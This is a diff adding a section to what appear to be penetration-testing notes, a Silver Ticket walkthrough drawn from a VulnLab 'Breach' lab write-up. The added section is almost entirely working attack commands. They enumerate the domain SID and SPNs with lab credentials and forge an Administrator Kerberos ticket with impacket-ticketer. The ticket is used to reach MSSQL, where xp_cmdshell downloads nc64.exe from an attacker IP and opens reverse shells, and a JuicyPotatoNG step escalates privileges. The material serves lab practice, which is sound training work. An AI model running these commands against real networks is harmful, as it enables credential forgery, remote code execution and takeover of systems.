@@ -113,6 +113,47 @@ iwr -UseDefaultCredentials http://web04 | findstr /i OS{
 
 ```
 
+### Another Silver Ticket Attack
+
+#### From VulnLab Breach
+https://medium.com/@persecure/breach-vulnlab-f30761f08be6
+
+```
+## We can get the Domain SID from impacket’s lookupsid:
+
+impacket-lookupsid breach.vl/svc_mssql:'Trustno1'@10.10.78.61
+
+## We can just convert the plaintext password to NTLM on any browser-based tool.
+https://codebeautify.org/ntlm-hash-generator
+
+## And lastly, for the SPN we can retrieve it from the kerberoast attack.
+GetUserSPNs.py breach.vl/Julia.Wong:Computer1
+
+## To create the silver ticket we need to use impacket-ticketer. Remember to choose Administrator as the user.
+
+impacket-ticketer -nthash '69596C7AA1E8DAEE17F8E78870E25A5C' -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' -domain breach.vl -spn 'MSSQLSvc/breach.vl:1433' -user-id 500 Administrator
+
+
+## Export the ticket.
+
+export KRB5CCNAME=Administrator.ccache
+
+## We can use the ticket to gain access to the mssql server..
+
+mssqlclient.py breach.vl -k -no-pass -windows-auth
+
+### This machine goes on to do this:
+
+xp_cmdshell powershell -c "wget -usebasicparsing http://10.8.1.176:8888/nc64.exe -o C:\Temp\nc64.exe"
+
+xp_cmdshell powershell -c "C:\Temp\nc64.exe -e cmd 10.8.1.176 443"
+
+## Privesc
+JuicyPotatoNG.exe -t * -p "nc64.exe" -a "-e cmd.exe 10.8.1.213 80"
+
+
+```
+
 ### Shadow Copies
 ```
 *Shadow Copies*
